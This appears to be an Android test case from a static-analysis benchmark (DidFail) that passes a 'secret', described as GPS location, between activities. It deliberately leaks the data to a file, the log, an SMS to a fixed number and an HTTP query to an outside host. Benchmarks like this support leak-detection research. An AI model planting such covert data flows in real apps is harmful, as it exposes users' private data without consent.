package org.cert.WriteFile;

import java.io.BufferedReader;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import org.cert.WriteFile.Button1Listener;
import org.cert.WriteFile.R;
import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.widget.Button;

/**
 * @testcase_name StartActivityForResult1
 * @version 0.1
 * @author Contributed by the DidFail project 
 * @author_mail (Maintainer) steven.arzt@cased.de
 * 
 * @description Reads the user's geographical location (via GPS) and leaks
 * 		it to the file system, and passes it to another activity using
 * 		startActivityForResult which writes it to a file.
 * @dataflow getLastKnownLocation -> startActivityForResult
 * 		-> onActivityResult -> FileOutputStream
 * @number_of_leaks 1
 * @challenges Inter-component communication using startActivityForResult
 * 		must be handled correctly
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}

		Button button1 = (Button) findViewById(R.id.button1);
		button1.setOnClickListener(new Button1Listener(this));
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {				// SOURCE
	  if (resultCode == 0 && requestCode == 0 && data != null) {
	    if (data.hasExtra("secret")) {
	    	if(data.getExtras().getString("secret") != null){
		    	String filename = "sinkFile.txt";
		    	String sinkData = data.getExtras().getString("secret");		// another source
		    	FileOutputStream outputStream;	
		    	try {
		    	  outputStream = openFileOutput(filename, Context.MODE_PRIVATE);
		    	  outputStream.write(sinkData.getBytes());		// SINK
		    	  outputStream.close();
		    	  Log.i(filename, sinkData);					// another sink
					SmsManager sms = SmsManager.getDefault();
					sms.sendTextMessage("+49 1234", null, sinkData, null, null); //sink, leak

					try {
						connect(sinkData);
					} catch (Exception e) {
						e.printStackTrace();
					}
		    	} catch (Exception e) {
		    	  e.printStackTrace();
		    	}
	    	}
	    	else
	    		Log.i("In WriteFile: ", "Data recieved");
	    }
	  }
	  else
  		Log.i("Back in WriteFile: ", "No data recieved");
		  
	}

	private void connect(String data) throws IOException {
		String URL = "http://www.google.de/search?q=";
		URL = URL.concat(data);
		java.net.URL url = new URL(URL);
		HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
		conn.setRequestMethod("GET");
		conn.setDoInput(true);
		// Starts the query
		conn.connect();

		InputStream is = conn.getInputStream();
		if (is == null)
			return;
		StringBuilder sb = new StringBuilder();
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		String line = null;
		try {
			while ((line = br.readLine()) != null)
				sb.append(line);
		} finally {
			br.close();
			is.close();
		}
		Log.d(getClass().getSimpleName(), sb.toString());
	}

}
